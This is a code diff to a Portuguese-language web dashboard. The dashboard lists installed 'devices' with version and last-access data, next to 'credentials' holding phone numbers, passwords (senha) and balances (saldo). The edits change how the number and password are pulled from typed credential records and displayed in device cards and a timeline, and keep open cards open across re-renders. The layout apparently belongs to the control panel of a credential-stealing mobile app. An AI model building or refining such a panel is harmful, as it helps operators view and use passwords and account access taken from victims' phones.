@@ -1180,7 +1180,7 @@ function renderLista(dispositivos, credenciais) {
         </div>
         <div class="cell hide-mobile" style="color:${desact?"#f97316":"var(--text)"}">${dev.versao || "—"}</div>
         <div class="cell hide-mobile">${formatDate(dev.ultimo_acesso)}</div>
-        <div class="cell hide-mobile">${devCreds[0]?.numero||"—"}</div>
+        <div class="cell hide-mobile">${devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero")[0]?.valor||"—"}</div>
         <div style="display:flex;align-items:center;gap:8px;justify-content:flex-end">
           <span class="badge ${activo ? 'active' : 'idle'}">${activo ? 'ACTIVO' : 'INACTIVO'}</span>
           <span class="chevron">▼</span>
@@ -1203,8 +1203,8 @@ function renderLista(dispositivos, credenciais) {
               <div class="info-row"><span class="info-label">Instalação</span><span class="info-val">${formatDate(dev.timestamp||dev.created_at)}</span></div>
               <div class="info-row"><span class="info-label">Último Acesso</span><span class="info-val green">${formatDate(dev.ultimo_acesso)}</span></div>
               <div class="info-row"><span class="info-label">Credenciais</span><span class="info-val ${devCreds.length?"red":""}">${devCreds.length} registos</span></div>
-              <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${devCreds[0]?.numero||'—'}</span></div>
-              <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${devCreds[0]?.senha||'—'}</span></div>
+              <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${devCreds.filter(c=>c.tipo==='Numero'||c.tipo==='numero')[0]?.valor||'—'}</span></div>
+              <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${devCreds.filter(c=>c.tipo==='Senha'||c.tipo==='senha')[0]?.valor||'—'}</span></div>
               <div class="info-row"><span class="info-label">Estado</span><span class="info-val ${activo?"green":""}">${activo?"Activo hoje":"Inactivo"}</span></div>
             </div>
           </div>
@@ -1224,15 +1224,11 @@ function renderLista(dispositivos, credenciais) {
               ? '<div style="color:var(--muted);font-family:var(--mono);font-size:12px;padding:10px 0">Sem credenciais registadas</div>'
               : devCreds.map(c => `
                 <div class="tl-item">
-                  <div class="tl-dot ${c.numero ? 'numero' : c.senha ? 'senha' : 'login'}"></div>
+                  <div class="tl-dot ${getTipoDot(c.tipo)}"></div>
                   <div class="tl-time">${formatDate(c.criado_em||c.created_at)}</div>
                   <div class="tl-content">
-                    <div class="tipo">🔑 Credencial</div>
-                    <div style="font-size:11px">
-                      ${c.numero ? '📞 <b>'+c.numero+'</b>' : ''}
-                      ${c.senha  ? ' · 🔒 '+c.senha : ''}
-                      ${c.saldo  ? ' · 💰 '+c.saldo : ''}
-                    </div>
+                    <div class="tipo">${getTipoLabel(c.tipo)}</div>
+                    <div>${c.numero?'📞 '+c.numero:''}${c.senha?' · 🔑 '+c.senha:''}${c.valor?c.valor:''}</div>
                   </div>
                 </div>
               `).join('')
@@ -1595,7 +1591,20 @@ setFiltroEstado = function(estado) {
 // Actualizar contador de dispositivos visíveis
 const _origRenderLista = renderLista;
 renderLista = function(devs, creds) {
+  // Guardar quais os cards que estavam abertos antes de re-renderizar
+  const abertos = new Set(
+    [...document.querySelectorAll('.device-card.open')]
+      .map(c => c.id.replace('card-',''))
+  );
+
   _origRenderLista(devs, creds !== undefined ? creds : todasCredenciais);
+
+  // Re-abrir os cards que estavam abertos
+  abertos.forEach(id => {
+    const card = document.getElementById('card-' + id);
+    if (card) card.classList.add('open');
+  });
+
   const el = document.getElementById('devices-count');
   if (el) el.textContent = (devs?.length ?? 0) + ' dispositivos';
 };
